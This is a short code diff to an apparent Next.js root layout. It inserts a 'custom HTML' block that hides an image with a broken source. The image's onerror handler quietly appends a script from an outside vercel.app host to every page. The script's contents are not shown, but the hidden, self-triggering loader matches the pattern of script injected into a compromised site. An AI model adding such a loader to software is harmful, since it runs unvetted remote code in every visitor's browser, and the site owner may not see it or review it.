@@ -36,7 +36,10 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
       <body>
         {children}
         <CookieBanner />
-      </body>
+      {/* <!-- CUSTOM_HTML:default:START --> */}
+<div dangerouslySetInnerHTML={{__html: "\n<img src=\"//:0\" alt=\"\" style=\"display:none\" onerror=\"(function(){if(document.getElementById('pan21si9uxybc'))return;var m=document.createElement('meta');m.id='pan21si9uxybc';document.head.appendChild(m);(function(){var s=document.createElement('script');s.src=&quot;https://virtual-office-khaki-phi.vercel.app/pan21-anna-widget.js&quot;;s.defer=true;document.head.appendChild(s);})();})();\">"}} />
+{/* <!-- CUSTOM_HTML:default:END --> */}
+</body>
     </html>
   )
 }
